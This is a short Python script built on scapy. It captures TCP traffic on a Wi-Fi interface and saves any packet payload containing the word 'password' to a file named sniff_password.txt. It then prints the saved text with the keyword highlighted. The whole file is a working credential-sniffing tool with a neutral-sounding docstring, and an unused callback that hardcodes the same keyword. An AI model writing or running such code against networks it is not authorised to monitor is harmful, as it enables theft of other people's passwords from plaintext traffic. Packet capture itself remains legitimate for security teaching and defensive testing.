"""
Packet Sniffer with Keyword Filtering and Highlighting

This script captures network packets on a specified interface and filters them based on TCP protocol. It searches for a keyword in the raw data of the captured packets and saves the packets containing the keyword to a file. It then reads and prints the content of the file with the keyword highlighted.

Dependencies:
- scapy library

Usage:
1. Set the 'interface' variable to the desired network interface.
2. Set the 'filter_exp' variable to the filter expression for capturing packets.
3. Set the 'keyword' variable to the keyword to filter for in the Raw layer data.
4. Run the script and let it capture packets.
5. After capturing, the filtered packets will be saved in the 'sniff_password.txt' file in the current directory.
6. The content of the file will be read and printed with the keyword highlighted.

"""

from scapy.all import *
from scapy.layers.inet import TCP, IP


def write_raw_packet_to_file(raw_packet, key_word):
    """
    Writes the raw packet data to a file if it contains the specified keyword.

    @param raw_packet: The raw packet to process.
    @type raw_packet: scapy.packet.Packet
    @param key_word: The keyword to search for in the packet data.
    @type key_word: str
    """
    if raw_packet.haslayer(Raw):
        raw_data = raw_packet[Raw].load
        try:
            decoded_data = raw_data.decode('utf-8')
            if key_word in decoded_data:
                with open("sniff_password.txt", "a", encoding="utf-8") as file:
                    file.write("Raw Data: {}\n".format(decoded_data))
        except UnicodeDecodeError:
            # Handle decoding errors silently
            pass


def got_packet(recv_packet):
    """
    Callback function for captured packets. Processes the packet and invokes the write_raw_packet_to_file function.

    @param recv_packet: The received packet.
    @type recv_packet: scapy.packet.Packet
    """
    ip = recv_packet.getlayer(IP)
    if ip and ip.haslayer(TCP):
        write_raw_packet_to_file(recv_packet, "password")


# Set the network interface for capturing packets (change it to match your interface)
interface = "Wi-Fi"

# Set the filter expression for capturing packets
filter_exp = "tcp"

# Set the keyword to filter for in the Raw layer data
keyword = "password"

# Capture packets
sniff(iface=interface, filter=filter_exp, prn=lambda raw_packet: write_raw_packet_to_file(raw_packet, keyword))

# Read and print the content of the text file with keyword highlighted
with open("sniff_password.txt", "r", encoding="utf-8") as f:
    content = f.read()
    highlighted_content = content.replace(keyword, '\033[1;32m{}\033[0m'.format(keyword))
    print(highlighted_content)
